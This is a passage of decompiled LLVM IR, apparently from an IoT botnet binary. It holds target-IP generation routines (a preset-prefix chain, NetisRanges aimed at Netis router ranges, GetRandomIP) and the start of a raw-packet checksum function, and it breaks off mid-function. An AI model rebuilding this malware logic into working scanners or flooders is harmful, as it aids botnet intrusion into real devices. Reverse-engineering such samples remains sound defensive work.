dec_label_pc_10005150:                            ; preds = %dec_label_pc_100050fc, %dec_label_pc_10005108
  %v3_10005154 = icmp eq i32 %v2_10003364, 91
  br i1 %v3_10005154, label %dec_label_pc_1000515c, label %dec_label_pc_100051a4

dec_label_pc_1000515c:                            ; preds = %dec_label_pc_10005150
  %v2_1000515c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005170 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005170 = zext i8 %v3_10005170 to i32
  %v4_100051a0 = call i32 @szprintf(i32 %v2_1000515c, i32 ptrtoint ([13 x i8]* @global_var_100141f8.147 to i32), i32 %v4_10005170)
  br label %dec_label_pc_100051a4

dec_label_pc_100051a4:                            ; preds = %dec_label_pc_10005150, %dec_label_pc_1000515c
  %v3_100051a8 = icmp eq i32 %v2_10003364, 92
  br i1 %v3_100051a8, label %dec_label_pc_100051b0, label %dec_label_pc_100051f8

dec_label_pc_100051b0:                            ; preds = %dec_label_pc_100051a4
  %v2_100051b0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100051c4 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100051c4 = zext i8 %v3_100051c4 to i32
  %v4_100051f4 = call i32 @szprintf(i32 %v2_100051b0, i32 ptrtoint ([13 x i8]* @global_var_10014208.148 to i32), i32 %v4_100051c4)
  br label %dec_label_pc_100051f8

dec_label_pc_100051f8:                            ; preds = %dec_label_pc_100051a4, %dec_label_pc_100051b0
  %v3_100051fc = icmp eq i32 %v2_10003364, 93
  br i1 %v3_100051fc, label %dec_label_pc_10005204, label %dec_label_pc_1000524c

dec_label_pc_10005204:                            ; preds = %dec_label_pc_100051f8
  %v2_10005204 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005218 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005218 = zext i8 %v3_10005218 to i32
  %v4_10005248 = call i32 @szprintf(i32 %v2_10005204, i32 ptrtoint ([13 x i8]* @global_var_10013ccc.58 to i32), i32 %v4_10005218)
  br label %dec_label_pc_1000524c

dec_label_pc_1000524c:                            ; preds = %dec_label_pc_100051f8, %dec_label_pc_10005204
  %v3_10005250 = icmp eq i32 %v2_10003364, 94
  br i1 %v3_10005250, label %dec_label_pc_10005258, label %dec_label_pc_100052a0

dec_label_pc_10005258:                            ; preds = %dec_label_pc_1000524c
  %v2_10005258 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000526c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000526c = zext i8 %v3_1000526c to i32
  %v4_1000529c = call i32 @szprintf(i32 %v2_10005258, i32 ptrtoint ([13 x i8]* @global_var_10014218.149 to i32), i32 %v4_1000526c)
  br label %dec_label_pc_100052a0

dec_label_pc_100052a0:                            ; preds = %dec_label_pc_1000524c, %dec_label_pc_10005258
  %v3_100052a4 = icmp eq i32 %v2_10003364, 95
  br i1 %v3_100052a4, label %dec_label_pc_100052ac, label %dec_label_pc_100052f4

dec_label_pc_100052ac:                            ; preds = %dec_label_pc_100052a0
  %v2_100052ac = ptrtoint i32* %stack_var_-52 to i32
  %v3_100052c0 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100052c0 = zext i8 %v3_100052c0 to i32
  %v4_100052f0 = call i32 @szprintf(i32 %v2_100052ac, i32 ptrtoint ([13 x i8]* @global_var_10014228.150 to i32), i32 %v4_100052c0)
  br label %dec_label_pc_100052f4

dec_label_pc_100052f4:                            ; preds = %dec_label_pc_100052a0, %dec_label_pc_100052ac
  %v3_100052f8 = icmp eq i32 %v2_10003364, 96
  br i1 %v3_100052f8, label %dec_label_pc_10005300, label %dec_label_pc_10005348

dec_label_pc_10005300:                            ; preds = %dec_label_pc_100052f4
  %v2_10005300 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005314 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005314 = zext i8 %v3_10005314 to i32
  %v4_10005344 = call i32 @szprintf(i32 %v2_10005300, i32 ptrtoint ([13 x i8]* @global_var_10014238.151 to i32), i32 %v4_10005314)
  br label %dec_label_pc_10005348

dec_label_pc_10005348:                            ; preds = %dec_label_pc_100052f4, %dec_label_pc_10005300
  %v3_1000534c = icmp eq i32 %v2_10003364, 97
  br i1 %v3_1000534c, label %dec_label_pc_10005354, label %dec_label_pc_1000539c

dec_label_pc_10005354:                            ; preds = %dec_label_pc_10005348
  %v2_10005354 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005368 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005368 = zext i8 %v3_10005368 to i32
  %v4_10005398 = call i32 @szprintf(i32 %v2_10005354, i32 ptrtoint ([13 x i8]* @global_var_10014248.152 to i32), i32 %v4_10005368)
  br label %dec_label_pc_1000539c

dec_label_pc_1000539c:                            ; preds = %dec_label_pc_10005348, %dec_label_pc_10005354
  %v3_100053a0 = icmp eq i32 %v2_10003364, 98
  br i1 %v3_100053a0, label %dec_label_pc_100053a8, label %dec_label_pc_100053f0

dec_label_pc_100053a8:                            ; preds = %dec_label_pc_1000539c
  %v2_100053a8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100053bc = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100053bc = zext i8 %v3_100053bc to i32
  %v4_100053ec = call i32 @szprintf(i32 %v2_100053a8, i32 ptrtoint ([13 x i8]* @global_var_10014258.153 to i32), i32 %v4_100053bc)
  br label %dec_label_pc_100053f0

dec_label_pc_100053f0:                            ; preds = %dec_label_pc_1000539c, %dec_label_pc_100053a8
  %v3_100053f4 = icmp eq i32 %v2_10003364, 99
  br i1 %v3_100053f4, label %dec_label_pc_100053fc, label %dec_label_pc_10005444

dec_label_pc_100053fc:                            ; preds = %dec_label_pc_100053f0
  %v2_100053fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005410 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005410 = zext i8 %v3_10005410 to i32
  %v4_10005440 = call i32 @szprintf(i32 %v2_100053fc, i32 ptrtoint ([13 x i8]* @global_var_10014268.154 to i32), i32 %v4_10005410)
  br label %dec_label_pc_10005444

dec_label_pc_10005444:                            ; preds = %dec_label_pc_100053f0, %dec_label_pc_100053fc
  %v3_10005448 = icmp eq i32 %v2_10003364, 100
  br i1 %v3_10005448, label %dec_label_pc_10005450, label %dec_label_pc_10005498

dec_label_pc_10005450:                            ; preds = %dec_label_pc_10005444
  %v2_10005450 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005464 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005464 = zext i8 %v3_10005464 to i32
  %v4_10005494 = call i32 @szprintf(i32 %v2_10005450, i32 ptrtoint ([13 x i8]* @global_var_10014278.155 to i32), i32 %v4_10005464)
  br label %dec_label_pc_10005498

dec_label_pc_10005498:                            ; preds = %dec_label_pc_10005444, %dec_label_pc_10005450
  %v3_1000549c = icmp eq i32 %v2_10003364, 101
  br i1 %v3_1000549c, label %dec_label_pc_100054a4, label %dec_label_pc_100054ec

dec_label_pc_100054a4:                            ; preds = %dec_label_pc_10005498
  %v2_100054a4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100054b8 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100054b8 = zext i8 %v3_100054b8 to i32
  %v4_100054e8 = call i32 @szprintf(i32 %v2_100054a4, i32 ptrtoint ([13 x i8]* @global_var_10014288.156 to i32), i32 %v4_100054b8)
  br label %dec_label_pc_100054ec

dec_label_pc_100054ec:                            ; preds = %dec_label_pc_10005498, %dec_label_pc_100054a4
  %v3_100054f0 = icmp eq i32 %v2_10003364, 102
  br i1 %v3_100054f0, label %dec_label_pc_100054f8, label %dec_label_pc_10005540

dec_label_pc_100054f8:                            ; preds = %dec_label_pc_100054ec
  %v2_100054f8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000550c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000550c = zext i8 %v3_1000550c to i32
  %v4_1000553c = call i32 @szprintf(i32 %v2_100054f8, i32 ptrtoint ([12 x i8]* @global_var_10014298.157 to i32), i32 %v4_1000550c)
  br label %dec_label_pc_10005540

dec_label_pc_10005540:                            ; preds = %dec_label_pc_100054ec, %dec_label_pc_100054f8
  %v3_10005544 = icmp eq i32 %v2_10003364, 103
  br i1 %v3_10005544, label %dec_label_pc_1000554c, label %dec_label_pc_10005594

dec_label_pc_1000554c:                            ; preds = %dec_label_pc_10005540
  %v2_1000554c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005560 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005560 = zext i8 %v3_10005560 to i32
  %v4_10005590 = call i32 @szprintf(i32 %v2_1000554c, i32 ptrtoint ([13 x i8]* @global_var_100142a4.158 to i32), i32 %v4_10005560)
  br label %dec_label_pc_10005594

dec_label_pc_10005594:                            ; preds = %dec_label_pc_10005540, %dec_label_pc_1000554c
  %v3_10005598 = icmp eq i32 %v2_10003364, 104
  br i1 %v3_10005598, label %dec_label_pc_100055a0, label %dec_label_pc_100055e8

dec_label_pc_100055a0:                            ; preds = %dec_label_pc_10005594
  %v2_100055a0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100055b4 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100055b4 = zext i8 %v3_100055b4 to i32
  %v4_100055e4 = call i32 @szprintf(i32 %v2_100055a0, i32 ptrtoint ([13 x i8]* @global_var_100142b4.159 to i32), i32 %v4_100055b4)
  br label %dec_label_pc_100055e8

dec_label_pc_100055e8:                            ; preds = %dec_label_pc_10005594, %dec_label_pc_100055a0
  %v3_100055ec = icmp eq i32 %v2_10003364, 105
  br i1 %v3_100055ec, label %dec_label_pc_100055f4, label %dec_label_pc_1000563c

dec_label_pc_100055f4:                            ; preds = %dec_label_pc_100055e8
  %v2_100055f4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005608 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005608 = zext i8 %v3_10005608 to i32
  %v4_10005638 = call i32 @szprintf(i32 %v2_100055f4, i32 ptrtoint ([13 x i8]* @global_var_100142c4.160 to i32), i32 %v4_10005608)
  br label %dec_label_pc_1000563c

dec_label_pc_1000563c:                            ; preds = %dec_label_pc_100055e8, %dec_label_pc_100055f4
  %v3_10005640 = icmp eq i32 %v2_10003364, 106
  br i1 %v3_10005640, label %dec_label_pc_10005648, label %dec_label_pc_10005690

dec_label_pc_10005648:                            ; preds = %dec_label_pc_1000563c
  %v2_10005648 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000565c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000565c = zext i8 %v3_1000565c to i32
  %v4_1000568c = call i32 @szprintf(i32 %v2_10005648, i32 ptrtoint ([12 x i8]* @global_var_100142d4.161 to i32), i32 %v4_1000565c)
  br label %dec_label_pc_10005690

dec_label_pc_10005690:                            ; preds = %dec_label_pc_1000563c, %dec_label_pc_10005648
  %v3_10005694 = icmp eq i32 %v2_10003364, 107
  br i1 %v3_10005694, label %dec_label_pc_1000569c, label %dec_label_pc_100056e4

dec_label_pc_1000569c:                            ; preds = %dec_label_pc_10005690
  %v2_1000569c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100056b0 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100056b0 = zext i8 %v3_100056b0 to i32
  %v4_100056e0 = call i32 @szprintf(i32 %v2_1000569c, i32 ptrtoint ([13 x i8]* @global_var_100142e0.162 to i32), i32 %v4_100056b0)
  br label %dec_label_pc_100056e4

dec_label_pc_100056e4:                            ; preds = %dec_label_pc_10005690, %dec_label_pc_1000569c
  %v3_100056e8 = icmp eq i32 %v2_10003364, 108
  br i1 %v3_100056e8, label %dec_label_pc_100056f0, label %dec_label_pc_10005738

dec_label_pc_100056f0:                            ; preds = %dec_label_pc_100056e4
  %v2_100056f0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005704 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005704 = zext i8 %v3_10005704 to i32
  %v4_10005734 = call i32 @szprintf(i32 %v2_100056f0, i32 ptrtoint ([14 x i8]* @global_var_100142f0.163 to i32), i32 %v4_10005704)
  br label %dec_label_pc_10005738

dec_label_pc_10005738:                            ; preds = %dec_label_pc_100056e4, %dec_label_pc_100056f0
  %v3_1000573c = icmp eq i32 %v2_10003364, 109
  br i1 %v3_1000573c, label %dec_label_pc_10005744, label %dec_label_pc_1000578c

dec_label_pc_10005744:                            ; preds = %dec_label_pc_10005738
  %v2_10005744 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005758 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005758 = zext i8 %v3_10005758 to i32
  %v4_10005788 = call i32 @szprintf(i32 %v2_10005744, i32 ptrtoint ([14 x i8]* @global_var_10014300.164 to i32), i32 %v4_10005758)
  br label %dec_label_pc_1000578c

dec_label_pc_1000578c:                            ; preds = %dec_label_pc_10005738, %dec_label_pc_10005744
  %v3_10005790 = icmp eq i32 %v2_10003364, 110
  br i1 %v3_10005790, label %dec_label_pc_10005798, label %dec_label_pc_100057e0

dec_label_pc_10005798:                            ; preds = %dec_label_pc_1000578c
  %v2_10005798 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100057ac = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100057ac = zext i8 %v3_100057ac to i32
  %v4_100057dc = call i32 @szprintf(i32 %v2_10005798, i32 ptrtoint ([13 x i8]* @global_var_10014310.165 to i32), i32 %v4_100057ac)
  br label %dec_label_pc_100057e0

dec_label_pc_100057e0:                            ; preds = %dec_label_pc_1000578c, %dec_label_pc_10005798
  %v3_100057e4 = icmp eq i32 %v2_10003364, 111
  br i1 %v3_100057e4, label %dec_label_pc_100057ec, label %dec_label_pc_10005834

dec_label_pc_100057ec:                            ; preds = %dec_label_pc_100057e0
  %v2_100057ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005800 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005800 = zext i8 %v3_10005800 to i32
  %v4_10005830 = call i32 @szprintf(i32 %v2_100057ec, i32 ptrtoint ([14 x i8]* @global_var_10014320.166 to i32), i32 %v4_10005800)
  br label %dec_label_pc_10005834

dec_label_pc_10005834:                            ; preds = %dec_label_pc_100057e0, %dec_label_pc_100057ec
  %v3_10005838 = icmp eq i32 %v2_10003364, 112
  br i1 %v3_10005838, label %dec_label_pc_10005840, label %dec_label_pc_10005888

dec_label_pc_10005840:                            ; preds = %dec_label_pc_10005834
  %v2_10005840 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005854 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10005854 = zext i8 %v3_10005854 to i32
  %v4_10005884 = call i32 @szprintf(i32 %v2_10005840, i32 ptrtoint ([14 x i8]* @global_var_10014330.167 to i32), i32 %v4_10005854)
  br label %dec_label_pc_10005888

dec_label_pc_10005888:                            ; preds = %dec_label_pc_10005834, %dec_label_pc_10005840
  %v3_1000588c = icmp eq i32 %v2_10003364, 113
  br i1 %v3_1000588c, label %dec_label_pc_10005894, label %dec_label_pc_100058dc

dec_label_pc_10005894:                            ; preds = %dec_label_pc_10005888
  %v2_10005894 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100058a8 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100058a8 = zext i8 %v3_100058a8 to i32
  %v4_100058d8 = call i32 @szprintf(i32 %v2_10005894, i32 ptrtoint ([13 x i8]* @global_var_10014340.168 to i32), i32 %v4_100058a8)
  br label %dec_label_pc_100058dc

dec_label_pc_100058dc:                            ; preds = %dec_label_pc_10005888, %dec_label_pc_10005894
  %v3_100058e0 = icmp eq i32 %v2_10003364, 114
  %v2_100058e8 = ptrtoint i32* %stack_var_-52 to i32
  br i1 %v3_100058e0, label %dec_label_pc_100058e8, label %dec_label_pc_10005930

dec_label_pc_100058e8:                            ; preds = %dec_label_pc_100058dc
  %v3_100058fc = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100058fc = zext i8 %v3_100058fc to i32
  %v4_1000592c = call i32 @szprintf(i32 %v2_100058e8, i32 ptrtoint ([14 x i8]* @global_var_10014350.169 to i32), i32 %v4_100058fc)
  br label %dec_label_pc_10005930

dec_label_pc_10005930:                            ; preds = %dec_label_pc_100058dc, %dec_label_pc_100058e8
  br i1 false, label %dec_label_pc_1000593c, label %dec_label_pc_10005984

dec_label_pc_1000593c:                            ; preds = %dec_label_pc_10005930
  br label %dec_label_pc_10005984

dec_label_pc_10005984:                            ; preds = %dec_label_pc_10005930, %dec_label_pc_1000593c
  store i32 268458384, i32* @lr, align 4
  %v1_1000598c = call i32 @inet_addr(i32 %v2_100058e8)
  ret i32 %v1_1000598c

; uselistorder directives
  uselistorder i8* @global_var_1002e604.57, { 1, 0 }
  uselistorder label %dec_label_pc_10005984, { 1, 0 }
  uselistorder label %dec_label_pc_10005930, { 1, 0 }
  uselistorder label %dec_label_pc_100058dc, { 1, 0 }
  uselistorder label %dec_label_pc_10005888, { 1, 0 }
  uselistorder label %dec_label_pc_10005834, { 1, 0 }
  uselistorder label %dec_label_pc_100057e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000578c, { 1, 0 }
  uselistorder label %dec_label_pc_10005738, { 1, 0 }
  uselistorder label %dec_label_pc_100056e4, { 1, 0 }
  uselistorder label %dec_label_pc_10005690, { 1, 0 }
  uselistorder label %dec_label_pc_1000563c, { 1, 0 }
  uselistorder label %dec_label_pc_100055e8, { 1, 0 }
  uselistorder label %dec_label_pc_10005594, { 1, 0 }
  uselistorder label %dec_label_pc_10005540, { 1, 0 }
  uselistorder label %dec_label_pc_100054ec, { 1, 0 }
  uselistorder label %dec_label_pc_10005498, { 1, 0 }
  uselistorder label %dec_label_pc_10005444, { 1, 0 }
  uselistorder label %dec_label_pc_100053f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000539c, { 1, 0 }
  uselistorder label %dec_label_pc_10005348, { 1, 0 }
  uselistorder label %dec_label_pc_100052f4, { 1, 0 }
  uselistorder label %dec_label_pc_100052a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000524c, { 1, 0 }
  uselistorder label %dec_label_pc_100051f8, { 1, 0 }
  uselistorder label %dec_label_pc_100051a4, { 1, 0 }
  uselistorder label %dec_label_pc_10005150, { 1, 0 }
  uselistorder label %dec_label_pc_100050fc, { 1, 0 }
  uselistorder label %dec_label_pc_100050a8, { 1, 0 }
  uselistorder label %dec_label_pc_10005054, { 1, 0 }
  uselistorder label %dec_label_pc_10005000, { 1, 0 }
  uselistorder label %dec_label_pc_10004fac, { 1, 0 }
  uselistorder label %dec_label_pc_10004f58, { 1, 0 }
  uselistorder label %dec_label_pc_10004f04, { 1, 0 }
  uselistorder label %dec_label_pc_10004eb0, { 1, 0 }
  uselistorder label %dec_label_pc_10004e5c, { 1, 0 }
  uselistorder label %dec_label_pc_10004e08, { 1, 0 }
  uselistorder label %dec_label_pc_10004db4, { 1, 0 }
  uselistorder label %dec_label_pc_10004d60, { 1, 0 }
  uselistorder label %dec_label_pc_10004d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10004cb8, { 1, 0 }
  uselistorder label %dec_label_pc_10004c64, { 1, 0 }
  uselistorder label %dec_label_pc_10004c10, { 1, 0 }
  uselistorder label %dec_label_pc_10004bbc, { 1, 0 }
  uselistorder label %dec_label_pc_10004b68, { 1, 0 }
  uselistorder label %dec_label_pc_10004b14, { 1, 0 }
  uselistorder label %dec_label_pc_10004ac0, { 1, 0 }
  uselistorder label %dec_label_pc_10004a6c, { 1, 0 }
  uselistorder label %dec_label_pc_10004a18, { 1, 0 }
  uselistorder label %dec_label_pc_100049c4, { 1, 0 }
  uselistorder label %dec_label_pc_10004970, { 1, 0 }
  uselistorder label %dec_label_pc_1000491c, { 1, 0 }
  uselistorder label %dec_label_pc_100048c8, { 1, 0 }
  uselistorder label %dec_label_pc_10004874, { 1, 0 }
  uselistorder label %dec_label_pc_10004820, { 1, 0 }
  uselistorder label %dec_label_pc_100047cc, { 1, 0 }
  uselistorder label %dec_label_pc_10004778, { 1, 0 }
  uselistorder label %dec_label_pc_10004724, { 1, 0 }
  uselistorder label %dec_label_pc_100046d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000467c, { 1, 0 }
  uselistorder label %dec_label_pc_10004628, { 1, 0 }
  uselistorder label %dec_label_pc_100045d4, { 1, 0 }
  uselistorder label %dec_label_pc_10004580, { 1, 0 }
  uselistorder label %dec_label_pc_1000452c, { 1, 0 }
  uselistorder label %dec_label_pc_100044d8, { 1, 0 }
  uselistorder label %dec_label_pc_10004484, { 1, 0 }
  uselistorder label %dec_label_pc_10004430, { 1, 0 }
  uselistorder label %dec_label_pc_100043dc, { 1, 0 }
  uselistorder label %dec_label_pc_10004388, { 1, 0 }
  uselistorder label %dec_label_pc_10004334, { 1, 0 }
  uselistorder label %dec_label_pc_100042e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000428c, { 1, 0 }
  uselistorder label %dec_label_pc_10004238, { 1, 0 }
  uselistorder label %dec_label_pc_100041e4, { 1, 0 }
  uselistorder label %dec_label_pc_10004190, { 1, 0 }
  uselistorder label %dec_label_pc_1000413c, { 1, 0 }
  uselistorder label %dec_label_pc_100040e8, { 1, 0 }
  uselistorder label %dec_label_pc_10004094, { 1, 0 }
  uselistorder label %dec_label_pc_10004040, { 1, 0 }
  uselistorder label %dec_label_pc_10003fec, { 1, 0 }
  uselistorder label %dec_label_pc_10003f98, { 1, 0 }
  uselistorder label %dec_label_pc_10003f44, { 1, 0 }
  uselistorder label %dec_label_pc_10003ef0, { 1, 0 }
  uselistorder label %dec_label_pc_10003e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10003e48, { 1, 0 }
  uselistorder label %dec_label_pc_10003df4, { 1, 0 }
  uselistorder label %dec_label_pc_10003da0, { 1, 0 }
  uselistorder label %dec_label_pc_10003d4c, { 1, 0 }
  uselistorder label %dec_label_pc_10003cf8, { 1, 0 }
  uselistorder label %dec_label_pc_10003ca4, { 1, 0 }
  uselistorder label %dec_label_pc_10003c50, { 1, 0 }
  uselistorder label %dec_label_pc_10003bfc, { 1, 0 }
  uselistorder label %dec_label_pc_10003ba8, { 1, 0 }
  uselistorder label %dec_label_pc_10003b54, { 1, 0 }
  uselistorder label %dec_label_pc_10003b00, { 1, 0 }
  uselistorder label %dec_label_pc_10003aac, { 1, 0 }
  uselistorder label %dec_label_pc_10003a58, { 1, 0 }
  uselistorder label %dec_label_pc_10003a04, { 1, 0 }
  uselistorder label %dec_label_pc_100039b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000395c, { 1, 0 }
  uselistorder label %dec_label_pc_10003908, { 1, 0 }
  uselistorder label %dec_label_pc_100038b4, { 1, 0 }
  uselistorder label %dec_label_pc_10003860, { 1, 0 }
  uselistorder label %dec_label_pc_1000380c, { 1, 0 }
  uselistorder label %dec_label_pc_100037b8, { 1, 0 }
  uselistorder label %dec_label_pc_10003764, { 1, 0 }
  uselistorder label %dec_label_pc_10003710, { 1, 0 }
  uselistorder label %dec_label_pc_100036bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003668, { 1, 0 }
  uselistorder label %dec_label_pc_10003614, { 1, 0 }
  uselistorder label %dec_label_pc_100035c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000356c, { 1, 0 }
  uselistorder label %dec_label_pc_10003518, { 1, 0 }
  uselistorder label %dec_label_pc_100034c4, { 1, 0 }
  uselistorder label %dec_label_pc_10003470, { 1, 0 }
  uselistorder label %dec_label_pc_1000341c, { 1, 0 }
  uselistorder label %dec_label_pc_100033c8, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  store i32 268458440, i32* @lr, align 4
  %v0_100059c4 = call i32 @random()
  %v1_100059cc = mul i32 %v0_100059c4, 4
  %v1_100059e0 = and i32 %v1_100059cc, 60
  %v2_100059e4 = add i32 %v1_100059e0, ptrtoint (i32* @global_var_1002e230.170 to i32)
  %v1_100059e8 = inttoptr i32 %v2_100059e4 to i32*
  %v2_100059e8 = load i32, i32* %v1_100059e8, align 4
  %v1_100059f8 = trunc i32 %v2_100059e8 to i8
  store i8 %v1_100059f8, i8* bitcast (i8** @global_var_1002e600.53 to i8*), align 4
  store i32 268458496, i32* @lr, align 4
  %v0_100059fc = call i32 @random()
  %v2_10005a1c = srem i32 %v0_100059fc, 255
  %v1_10005a44 = trunc i32 %v2_10005a1c to i8
  store i8 %v1_10005a44, i8* @global_var_1002e601.54, align 1
  store i32 268458572, i32* @lr, align 4
  %v0_10005a48 = call i32 @random()
  %v2_10005a68 = srem i32 %v0_10005a48, 255
  %v1_10005a90 = trunc i32 %v2_10005a68 to i8
  store i8 %v1_10005a90, i8* @global_var_1002e602.55, align 1
  store i32 268458648, i32* @lr, align 4
  %v0_10005a94 = call i32 @random()
  %v2_10005aa4 = sext i32 %v0_10005a94 to i64
  %v4_10005aa4 = mul nsw i64 %v2_10005aa4, -2139062143
  %v5_10005aa4 = udiv i64 %v4_10005aa4, 4294967296
  %v6_10005aa4 = trunc i64 %v5_10005aa4 to i32
  %v2_10005aa8 = add i32 %v6_10005aa4, %v0_10005a94
  %v1_10005aac = udiv i32 %v2_10005aa8, 128
  %tmp = icmp slt i32 %v0_10005a94, 0
  %v1_10005ab0 = zext i1 %tmp to i32
  %v2_10005ab0 = ashr i32 %v0_10005a94, 31
  %v3_10005ab0 = and i32 %v2_10005ab0, -2
  %v4_10005ab0 = or i32 %v3_10005ab0, %v1_10005ab0
  %v2_10005ab4 = sub nsw i32 %v1_10005aac, %v4_10005ab0
  %tmp14 = mul i32 %v2_10005ab4, -255
  %v2_10005ac4 = add i32 %tmp14, %v0_10005a94
  %v1_10005adc = trunc i32 %v2_10005ac4 to i8
  store i8 %v1_10005adc, i8* @global_var_1002e603.56, align 1
  store i32 0, i32* %stack_var_-52, align 4
  %v2_10005b00 = ptrtoint i32* %stack_var_-52 to i32
  %v2_10005b14 = load i8, i8* bitcast (i8** @global_var_1002e600.53 to i8*), align 4
  %v3_10005b14 = zext i8 %v2_10005b14 to i32
  %v4_10005b70 = call i32 @szprintf(i32 %v2_10005b00, i32 ptrtoint ([12 x i8]* @global_var_10014360.171 to i32), i32 %v3_10005b14)
  store i32 268458880, i32* @lr, align 4
  %v1_10005b7c = call i32 @inet_addr(i32 %v2_10005b00)
  ret i32 %v1_10005b7c

; uselistorder directives
  uselistorder i32 %v2_10005b00, { 1, 0 }
  uselistorder i32 %v0_10005a94, { 1, 3, 0, 2, 4 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i8* @global_var_1002e603.56, { 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_1002e602.55, { 2, 1, 0 }
  uselistorder i8* @global_var_1002e601.54, { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1002e600.53 to i8*), { 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10005bbc = load i32, i32* @global_var_1002e610.172, align 4
  store i32 %v3_10005bbc, i32* @r3, align 4
  %v2_10005bc4 = call i32 @ntohl(i32 %v3_10005bbc, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v2_10005bd0 = and i32 %v2_10005bc4, %arg1
  %v0_10005bd8 = call i32 @rand_cmwc()
  %v1_10005be4 = sub i32 -1, %arg1
  %v2_10005be8 = and i32 %v0_10005bd8, %v1_10005be4
  %v2_10005bf0 = xor i32 %v2_10005be8, %v2_10005bd0
  ret i32 %v2_10005bf0
}

define i32 @csum(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp21 = call i16 @__decompiler_undefined_function_4()
  %v2_10005c803 = icmp sgt i32 %arg2, 1
  br i1 %v2_10005c803, label %dec_label_pc_10005c38, label %dec_label_pc_10005c88

dec_label_pc_10005c38:                            ; preds = %entry, %dec_label_pc_10005c38
  %stack_var_-24.08 = phi i16* [ %v5_10005c6c, %dec_label_pc_10005c38 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v1_10005c74, %dec_label_pc_10005c38 ], [ %arg2, %entry ]
  %stack_var_-16.06 = phi i32 [ %v5_10005c58, %dec_label_pc_10005c38 ], [ 0, %entry ]
  %stack_var_-12.05 = phi i32 [ %v2_10005c54, %dec_label_pc_10005c38 ], [ 0, %entry ]
  %v4_10005c38 = ptrtoint i16* %stack_var_-24.08 to i32
  %v2_10005c3c = load i16, i16* %stack_var_-24.08, align 2
  %v3_10005c3c = zext i16 %v2_10005c3c to i32
  %v2_10005c54 = add i32 %v3_10005c3c, %stack_var_-12.05
  %v3_10005c54 = icmp ult i32 %v2_10005c54, %stack_var_-12.05
  %v4_10005c58 = zext i1 %v3_10005c54 to i32
  %v5_10005c58 = add i32 %v4_10005c58, %stack_var_-16.06
  %v1_10005c68 = add i32 %v4_10005c38, 2
  %v5_10005c6c = inttoptr i32 %v1_10005c68 to i16*
  %v1_10005c74 = add nsw i32 %stack_var_-20.07, -2
